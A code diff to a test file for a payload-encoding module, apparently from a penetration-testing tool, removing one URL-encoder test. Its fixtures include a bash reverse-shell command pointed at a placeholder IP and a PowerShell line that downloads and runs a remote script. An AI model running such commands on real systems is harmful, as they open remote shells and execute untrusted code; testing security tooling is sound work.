@@ -1,5 +1,5 @@
 import { describe, it, expect } from "vitest";
-import { decodeUtf16leBase64, sqlQuote, urlEncodeFull, urlEncodeShell, utf16leBase64 } from "../../../engines/payloads/encode";
+import { decodeUtf16leBase64, sqlQuote, urlEncodeShell, utf16leBase64 } from "../../../engines/payloads/encode";
 import { PASTE_CONTEXTS, wrapForContext } from "../../../engines/payloads/context";
 
 const REV = "bash -i >& /dev/tcp/192.0.2.10/443 0>&1";
@@ -24,9 +24,6 @@ describe("encoders", () => {
   it("urlEncodeShell encodes an astral character (emoji) as UTF-8, and only a lone surrogate as U+FFFD", () => {
     expect(urlEncodeShell("a😀b")).toBe("a%F0%9F%98%80b");
     expect(urlEncodeShell("a\uD800b")).toBe("a%EF%BF%BDb");
-  });
-  it("urlEncodeFull is encodeURIComponent", () => {
-    expect(urlEncodeFull("a b&c")).toBe("a%20b%26c");
   });
   it("sqlQuote doubles single quotes", () => {
     expect(sqlQuote("IEX(New-Object Net.WebClient).DownloadString('http://x/rev.ps1')")).toContain("''http://x/rev.ps1''");
